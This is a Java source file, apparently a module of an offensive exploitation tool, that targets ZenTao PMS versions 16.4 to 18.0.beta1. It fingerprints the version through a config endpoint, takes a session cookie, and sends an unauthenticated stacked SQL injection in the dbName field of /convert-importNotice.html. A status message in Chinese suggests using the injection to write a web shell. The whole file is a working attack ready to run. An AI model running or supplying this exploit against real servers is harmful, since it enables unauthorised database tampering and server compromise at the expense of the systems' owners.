package fun.fireline.exp.zentaopms;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpToolOld;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ZenTaoPMS_SqlInjection_NoAuth_16to18 implements  ExploitInterface{
    private String target = null;
    private boolean isVul = false;

    public static int compareVersion(String v1, String v2) {
        if (v1.equals(v2)) {
            return 0;
        }
        String[] version1Array = v1.split("[._]");
        String[] version2Array = v2.split("[._]");
        int index = 0;
        int minLen = Math.min(version1Array.length, version2Array.length);
        long diff = 0;

        while (index < minLen
                && (diff = Long.parseLong(version1Array[index])
                - Long.parseLong(version2Array[index])) == 0) {
            index++;
        }
        if (diff == 0) {
            for (int i = index; i < version1Array.length; i++) {
                if (Long.parseLong(version1Array[i]) > 0) {
                    return 1;
                }
            }

            for (int i = index; i < version2Array.length; i++) {
                if (Long.parseLong(version2Array[i]) > 0) {
                    return -1;
                }
            }
            return 0;
        } else {
            return diff > 0 ? 1 : -1;
        }
    }

    @Override
    public String checkVul(String url) {
        if(url.endsWith("/")){
            this.target = url.substring(0, url.length()-1);
        }else{
            this.target = url;
        }
        String check_payload = "/index.php?mode=getconfig";
        Pattern pa=Pattern.compile(".*\"version\":\"(.*)\",\"requestType\".*");
        try {
            HashMap<String, String> headers = new HashMap<>();
            Response response = HttpTools.get(this.target + check_payload, headers, "UTF-8");
            if(response.getError()!=null){
                return response.getError();
            }
            String result = response.getText();
            Matcher ma=pa.matcher(result);
            if(ma.matches()){
                if(compareVersion(ma.group(1), "16.4.0") >= 0 && compareVersion(ma.group(1), "18.0.beta1") <= 0){
                    this.isVul = true;
                    return "[+] 存在 \"16.4~18.0.beta1 sql注入 不需要认证\" 漏洞";
                }
            }

        } catch (Exception e) {
            // 输出错误日志
            logger.error(e);
        }
        this.isVul = false;
        return "[-] 不存在 \"16.4~18.0.beta1 sql注入 不需要认证\" 漏洞";
    }

    @Override
    public String exeCmd(String cookie, String cmd, String encoding) {
        return null;
    }

    public String exeSql(String cookie, String sql, String encoding) throws UnsupportedEncodingException {
        HashMap<String, String> headers = new HashMap<>();
        Response response = HttpTools.get(this.target+"/misc-captcha-user.html", headers, "UTF-8");
        if(response.getError()!=null){
            return response.getError();
        }
        Pattern pa=Pattern.compile(".*Set-Cookie=\\[(.*?)\\].*");
        Matcher ma=pa.matcher(response.getHead());
        if(!ma.matches()){
            return "sql执行失败";
        }
        cookie = ma.group(1);
        pa=Pattern.compile(".*zentaosid=(.*?);.*");
        ma=pa.matcher(cookie);
        if(!ma.matches()){
            return "sql执行失败";
        }
        String zentaosid = ma.group(1);
        headers.put("Cookie", cookie);
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        String data = "dbName="+ URLEncoder.encode("test'; "+sql+"# ","UTF-8");
        response = HttpTools.post(this.target+"/convert-importNotice.html?zentaosid="+zentaosid, data, headers, "UTF-8");
        if(response.getError()!=null){
            return response.getError();
        }
        return "sql语句执行成功，该漏洞无回显，此处为堆叠注入，可以考虑写入shell";
    }

    @Override
    public String readFile(String cookie, String filename, String encoding) {
        return null;
    }

    @Override
    public String getWebPath() {
        return null;
    }

    @Override
    public String uploadFile(String cookie, String filename, String platform) throws Exception {
        return null;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
